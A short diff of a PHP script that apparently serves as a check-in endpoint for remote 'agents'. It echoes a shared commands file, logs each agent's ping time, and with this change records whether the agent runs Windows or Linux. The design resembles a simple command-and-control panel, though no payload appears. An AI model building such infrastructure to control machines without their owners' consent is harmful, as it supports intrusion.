@@ -4,6 +4,8 @@ echo file_get_contents("/var/www/html/cmds.txt");
 
 $id = intval($_GET['id']);
 $sid = strval($id);
+$os = strval($_GET['o']);
+
 
 if (!empty($id)) {
 
@@ -12,9 +14,19 @@ shell_exec("cat temping > ping.txt");
 
 $time = date("Y-m-d H:i:s"); 
 $file = 'ping.txt';
+
+
+if ($os == "W"){
 $current = file_get_contents($file);
-$current .= "Last Ping - Agent ".$id." => ".$time.PHP_EOL;
+$current .= "Last Ping - Agent ".$id." (Windows) => ".$time.PHP_EOL;
 file_put_contents($file, $current);
+}
+
+if ($os == "L"){
+$current = file_get_contents($file);
+$current .= "Last Ping - Agent ".$id." (Linux) => ".$time.PHP_EOL;
+file_put_contents($file, $current);
+}
 
 
 }
